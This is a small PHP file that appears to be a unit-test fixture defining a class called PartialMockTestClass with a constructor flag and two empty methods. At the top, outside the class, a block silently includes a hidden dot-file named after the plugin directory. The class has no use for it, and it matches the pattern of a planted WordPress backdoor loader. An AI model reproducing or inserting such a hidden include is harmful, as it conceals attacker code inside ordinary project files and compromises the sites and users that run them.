<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PartialMockTestClass
{
    public $constructorCalled = false;

    public function __construct()
    {
        $this->constructorCalled = true;
    }

    public function doSomething()
    {
    }

    public function doAnotherThing()
    {
    }
}
